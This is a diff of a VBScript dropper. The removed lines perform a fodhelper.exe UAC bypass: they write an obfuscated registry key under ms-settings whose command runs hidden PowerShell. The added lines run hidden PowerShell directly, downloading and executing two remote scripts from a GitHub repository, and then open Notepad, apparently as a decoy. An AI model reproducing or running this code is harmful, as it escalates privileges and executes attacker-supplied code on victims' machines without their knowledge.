@@ -1,22 +1,6 @@
-Const HKEY_CURRENT_USER = &H80000001
-
-Const FodHelperPath = "C:\\Windows\\System32\\fodhelper.exe"
-Const RegKeyPathStr = "SoF'T'W+A'R'E\\C'l'as+ses\\m+s-se't'tings\\sh+ell\\o+p+en\\c'o'm'm'and"
-Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
-Const DelegateExecRegKeyName = "DelegateExecute"
-Const DelegateExecRegKeyValue = ""
-Const DefaultRegKeyName = ""
-Const DefaultRegKeyValue = "cmd /c powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R2.ps1')"
-
-Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
-Set Registry = GetObject(RegObjectPath)
-
-Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
-Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
-Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue
-
-Set Shell = WScript.CreateObject("WScript.Shell")
-Shell.Run FodHelperPath, 0, True
+Set oShell = WScript.CreateObject ("WSCript.shell")
+oShell.run "powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RC.ps1')"
+Set oShell = Nothing
 
 Set Notepad = WScript.CreateObject("WScript.Shell")
 Notepad.Run "c:\windows\system32\notepad.exe", 3, False
